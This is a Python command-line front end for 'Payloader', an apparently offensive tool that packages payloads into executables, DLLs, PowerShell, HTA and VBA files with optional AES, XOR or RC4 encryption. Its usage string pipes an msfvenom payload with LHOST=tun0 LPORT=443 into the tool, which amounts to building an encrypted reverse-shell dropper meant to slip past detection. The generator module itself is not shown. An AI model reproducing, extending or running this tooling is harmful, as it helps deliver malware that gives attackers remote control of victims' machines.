#!/usr/bin/env python3

import argparse
import sys
import os


from generator import Generator


def main():
    parser = argparse.ArgumentParser(description='Payloader - A simple tool to generate payloads', add_help=True,
                                     prog='payloader', usage='%(prog)s template [options] < payload\nmsfvenom -p <payload> LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key key -f <matching format> | payloader <template> -a amd64 -p win -e xor -k wh1rl3y')
    parser.add_argument('template', help='Template name')
    parser.add_argument('--platform', '-p', choices=['win', 'nix'], help='Target platform')
    parser.add_argument('--architecture', '-a', choices=['x64', 'x86', 'arm64', 'arm'],
                        help='Target architecture')
    parser.add_argument('--outputDir', '-o', default=os.getcwd(), help='Target location')
    parser.add_argument('--format', '-f',
                        choices=['exe', 'dll', 'elf', 'elf-so', 'sh', 'bat', 'ps1', 'py', 'js', 'vba', 'hta', 'cs'],
                        required=True, help='Output format')
    parser.add_argument('--key', '-k', help='Key for encryption')
    parser.add_argument('--encrypt', '-e', choices=['aes', 'xor', 'rc4', 'none'], help='Encryption type',
                        default='none')
    parser.add_argument('--payload', help='Payload for encryption')
    parser.add_argument('--extra', help='Extra data for the template')
    parser.add_argument('--list', '-l', action='store_true', help='List available templates')
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')


    if '--list' in sys.argv or '-l' in sys.argv:
        Generator.list_templates()
        return

    args = parser.parse_args()

    if args.payload is None:
        args.payload = sys.stdin.read().strip()

    values = {
        'PAYLOAD': args.payload,
        'KEY': args.key,
        'EXTRA': args.extra
    }

    Generator(args.template, args.platform, args.architecture, args.outputDir, args.format, args.key, args.payload,
              values, args.encrypt, args.verbose).generate_payload()


if __name__ == '__main__':
    main()
